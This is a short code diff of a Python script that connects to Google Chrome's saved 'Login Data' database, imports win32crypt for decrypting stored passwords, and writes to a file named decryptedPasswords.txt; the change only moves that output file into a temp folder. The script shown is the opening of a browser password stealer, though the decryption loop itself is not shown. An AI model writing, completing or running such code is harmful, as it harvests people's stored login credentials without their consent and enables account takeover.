@@ -2,10 +2,11 @@ from os import getenv
 import sqlite3
 import win32crypt
 
-f = open('C://decryptedPasswords.txt', 'w')
+f = open('C://temp//decryptedPasswords.txt', 'w')
 
 # Connect to the Database
 conn = sqlite3.connect(getenv("APPDATA") + "\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
+
 cursor = conn.cursor()
 
 # Get the results
